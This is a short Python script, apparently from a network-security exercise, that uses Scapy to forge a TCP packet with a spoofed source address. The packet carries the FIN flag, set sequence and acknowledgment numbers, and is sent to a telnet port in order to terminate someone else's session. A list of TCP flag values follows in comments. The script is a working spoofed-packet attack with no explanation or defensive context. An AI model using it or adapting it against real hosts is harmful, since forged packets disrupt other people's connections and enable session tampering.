#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.0.2.6", dst="34.122.121.32")
tcp = TCP(sport=46762, dport=23, flags='F', seq=150, ack=89)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)

#FIN = 0x01
#SYN = 0x02
#RST = 0x04
#PSH = 0x08
#ACK = 0x10
#URG = 0x20
#ECE = 0x40
#CWR = 0x80